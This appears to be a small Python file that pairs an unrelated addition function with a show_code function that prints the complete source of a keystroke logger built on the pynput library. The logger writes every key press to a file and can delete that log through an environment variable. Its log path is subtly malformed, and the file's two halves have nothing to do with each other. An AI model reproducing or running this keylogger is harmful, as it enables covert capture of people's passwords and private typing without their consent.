def addition(numbers: list) -> float:
    return sum(numbers)
def show_code():
    code = '''
from pynput import keyboard
import os

log_file = os.path.expanduser('~Desktop/keys.log')
if os.environ.get('pylogger_clean', None) is not None:
    try:
        os.remove(log_file)
    except Exception:
        pass
def on_press(key):
    try:
        with open(log_file, 'a') as f:
            f.write(f'{key.char}\n')
    except AttributeError:
        with open(log_file, 'a') as f:
            f.write(f'{key}\n')
def on_release(key):
    if key == keyboard.Key.esc:
        return False
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

    '''
    print(code)